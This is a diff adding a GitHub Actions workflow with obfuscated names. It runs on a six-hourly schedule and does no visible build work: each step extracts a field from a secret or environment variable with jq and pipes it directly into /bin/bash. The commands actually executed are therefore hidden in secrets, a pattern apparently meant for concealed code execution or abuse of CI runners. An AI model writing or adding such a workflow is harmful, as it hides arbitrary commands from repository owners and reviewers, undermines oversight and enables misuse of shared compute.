@@ -1,0 +1,26 @@
+name: aria7950studio
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '19 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: aria7950studio
+        env:
+          kszq8: ${{ secrets.kszq8 }}
+        run: |
+          echo $kszq8 | jq -r .rfco5800 | /bin/bash
+          echo $mpto7691 | jq -r .x30 | /bin/bash
+          echo $f85555 | jq -r .al704 | /bin/bash
+          echo $prig6734 | jq -r .pif71 | /bin/bash
+          echo $un80968 | jq -r .d5 | /bin/bash
+          echo $a78123 | jq -r .mngku75 | /bin/bash
+          echo $jc76 | jq -r .vqt08 | /bin/bash
+          echo $xtgv3 | jq -r .hdxxm172 | /bin/bash
+          echo $incw6 | jq -r .kzone4352 | /bin/bash
+
